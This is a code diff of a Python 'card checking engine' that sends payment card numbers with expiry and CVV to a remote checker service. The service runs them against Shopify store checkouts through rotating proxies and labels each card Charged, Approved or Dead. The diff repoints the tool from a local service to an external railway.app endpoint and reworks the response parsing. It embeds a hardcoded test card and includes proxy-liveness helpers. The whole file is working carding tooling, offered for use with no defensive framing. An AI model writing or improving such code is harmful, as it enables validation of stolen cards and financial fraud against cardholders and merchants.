@@ -1,15 +1,15 @@
 """
 check_engine.py — Card checking engine + proxy utilities
-All card check calls go to a local checker service (localhost:8099).
-No external binaries or opaque modules are used.
+Uses the Shopify checkout API server via POST/JSON.
 """
 import asyncio
 import aiohttp
 import random
 import os
 import httpx
+import json
 
-CHECKER_API  = os.environ.get("CHECKER_API_URL", "https://web-production-a9462.up.railway.app")
+CHECKER_API = os.environ.get("CHECKER_API_URL", "https://web-production-a9462.up.railway.app/check")
 _API_TIMEOUT = httpx.Timeout(connect=5.0, read=30.0, write=5.0, pool=10.0)
 
 _http_client: httpx.AsyncClient | None = None
@@ -59,70 +59,80 @@ def _is_proxy_err(msg: str) -> bool:
 
 async def _call_checker_api(shop_url: str, card: str, proxy_raw: str) -> dict:
     """
-    POST to the local checker service at localhost:8099/check.
-    Returns a dict with keys: status, message, price, gateway, receipt_url.
-    Raises on connection error or non-200 response.
+    POST to the checker API (JSON). Parses the response correctly.
     """
     c = await _get_client()
-    r = await c.post(f"{CHECKER_API}/check", json={
+    payload = {
         "card":     card,
         "shop_url": shop_url,
         "proxy":    proxy_raw,
-    })
-    r.raise_for_status()
-    data   = r.json()
-    status = data.get("status", "ERROR")
+        "low":      True
+    }
+    try:
+        r = await c.post(f"{CHECKER_API}/check", json=payload)
+        r.raise_for_status()
+        data = r.json()
+    except Exception as e:
+        # Network or HTTP error – treat as retryable
+        return _make_result(
+            card, 'Dead',
+            message=f"API error: {str(e)[:100]}",
+            retryable=True,
+        )
+
+    # --- Parse API response ---
+    # The API returns fields: "Response", "error", "Price", "Gate", "Charged", "retryable"
+    status = data.get("Response", "ERROR").upper()
+    error_msg = data.get("error", "")
+    price = data.get("Price", "-")
+    gateway = data.get("Gate", "Shopify")
+    receipt_url = data.get("receipt_url", "")
+    retryable = data.get("retryable", False)
 
     if status == "CHARGED":
         return _make_result(
             card, 'Charged',
-            message     = data.get("message", "Payment captured"),
-            price       = data.get("amount", "-"),
-            gateway     = data.get("gateway", "Shopify Payments"),
-            receipt_url = data.get("receipt_url", ""),
-            proxy       = proxy_raw,
+            message="Payment captured",
+            price=price,
+            gateway=gateway,
+            receipt_url=receipt_url,
+            proxy=proxy_raw,
         )
-    if status == "APPROVED":
+    elif status == "APPROVED":
         return _make_result(
             card, 'Approved',
-            message = data.get("message", "Approved"),
-            price   = data.get("amount", "-"),
-            gateway = data.get("gateway", "Shopify Payments"),
-            proxy   = proxy_raw,
+            message="Approved (possible 3DS or insufficient funds)",
+            price=price,
+            gateway=gateway,
+            proxy=proxy_raw,
         )
-    if status == "DECLINED":
+    elif status == "DECLINED":
         return _make_result(
             card, 'Dead',
-            message   = data.get("message", "Declined"),
-            gateway   = data.get("gateway", "Shopify Payments"),
-            retryable = data.get("retryable", False),
+            message=error_msg or "Declined",
+            gateway=gateway,
+            retryable=retryable,
+            proxy=proxy_raw,
         )
-    # ERROR / unknown
-    return _make_result(
-        card, 'Dead',
-        message   = data.get("message", "Checker error"),
-        retryable = data.get("retryable", True),
-    )
+    else:
+        # ERROR or unknown
+        return _make_result(
+            card, 'Dead',
+            message=error_msg or "Checker error",
+            gateway=gateway,
+            retryable=retryable,
+            proxy=proxy_raw,
+        )
 
 async def test_site(site: str, proxy: str) -> dict:
-    """
-    Test whether a Shopify site is reachable and functioning.
-    Returns {'site': ..., 'status': 'alive'|'dead'|'step_error', ...}
-    """
     test_card = "5154623245618097|03|2032|156"
     try:
         result = await _call_checker_api(site, test_card, proxy)
-        # Any non-ERROR response means the site is reachable
         if result['status'] in ('Charged', 'Approved', 'Dead'):
             return {'site': site, 'status': 'alive'}
         return {'site': site, 'status': 'dead', 'msg': result.get('message', '')[:100]}
-    except httpx.ConnectError:
-        return {'site': site, 'status': 'dead', 'msg': 'Checker API not reachable'}
     except Exception as e:
-        msg = str(e)[:80]
-        if 'step' in msg.lower():
-            return {'site': site, 'status': 'step_error', 'msg': msg}
-        return {'site': site, 'status': 'dead', 'msg': msg}
+        return {'site': site, 'status': 'dead', 'msg': str(e)[:80]}
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
     """
@@ -134,13 +144,13 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy
     if not proxies:
         return _make_result(card, 'Dead', 'No proxy configured')
 
-    last_err     = 'Unknown error'
-    MAX_TRIES    = 8
+    last_err = 'Unknown error'
+    MAX_TRIES = 8
     failed_sites = set()
 
     for attempt in range(MAX_TRIES):
         available = [s for s in sites if s not in failed_sites] or list(sites)
-        shop_url  = random.choice(available)
+        shop_url = random.choice(available)
         proxy_raw = (start_proxy if attempt == 0 and start_proxy else random.choice(proxies))
 
         try:
@@ -193,18 +203,14 @@ def _proxy_to_url(proxy: str) -> str:
         return f'http://{p}'
     if len(parts) >= 4:
         host, port = parts[0], parts[1]
-        rest       = ':'.join(parts[2:])
-        mid        = rest.rfind(':')
-        user_part  = rest[:mid]
-        pw_part    = rest[mid+1:]
+        rest = ':'.join(parts[2:])
+        mid = rest.rfind(':')
+        user_part = rest[:mid]
+        pw_part = rest[mid+1:]
         return f'http://{user_part}:{pw_part}@{host}:{port}'
     return f'http://{p}'
 
 async def test_proxy(proxy: str) -> dict:
-    """
-    Test a proxy by making an HTTP request through it.
-    Returns {'proxy': ..., 'status': 'alive'|'dead'}
-    """
     proxy_url = _proxy_to_url(proxy)
     test_urls = [
         'http://httpbin.org/ip',
@@ -213,7 +219,7 @@ async def test_proxy(proxy: str) -> dict:
     ]
     try:
         timeout = aiohttp.ClientTimeout(total=15)
-        conn    = aiohttp.TCPConnector(ssl=False)
+        conn = aiohttp.TCPConnector(ssl=False)
         async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
             for url in test_urls:
                 try:
@@ -227,7 +233,6 @@ async def test_proxy(proxy: str) -> dict:
         return {'proxy': proxy, 'status': 'dead'}
 
 async def get_proxy_ip(proxy: str) -> str | None:
-    """Get the exit IP of a proxy."""
     proxy_url = _proxy_to_url(proxy)
     if proxy_url.startswith('socks'):
         return None
